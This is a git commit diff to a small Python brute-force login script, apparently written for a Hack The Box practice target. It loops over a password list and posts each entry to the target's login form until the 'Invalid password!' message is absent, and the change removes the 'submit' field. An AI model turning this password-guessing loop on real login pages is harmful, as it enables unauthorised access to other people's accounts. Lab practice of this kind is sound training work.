5e374f83cd7758109b4b52b6cfecc7283178bc71
evanlutz725 <36962977+evanlutz725@users.noreply.github.com>
2019-03-11 13:51:59 -0500

    Update
    Fix an error in the data switch

--- Brute_Force_Login_Tool.py
+++ Brute_Force_Login_Tool.py
@@ -12,7 +12,7 @@ for line in f:
 	#this website only has a password parameter to test. If I was to use a username and password,
 	#I would utlize a second username file and a nested loop, with an additional dictionary entry
 	#of 'username':str(user), based on the line item variable assigned for the usernames.
-	r = requests.post('http://docker.hackthebox.eu:34224/', data={'password':str(line),'submit':'Submit'})
+	r = requests.post('http://docker.hackthebox.eu:34224/', data={'password':str(line)})
 	#this is unique to this particular webpage and the returned html starts with 'Invalid password!'
 	#so should I find a successful password, the inclination is to believe that it wouldn't contain that string.
 	if 'Invalid password!' not in r.text:
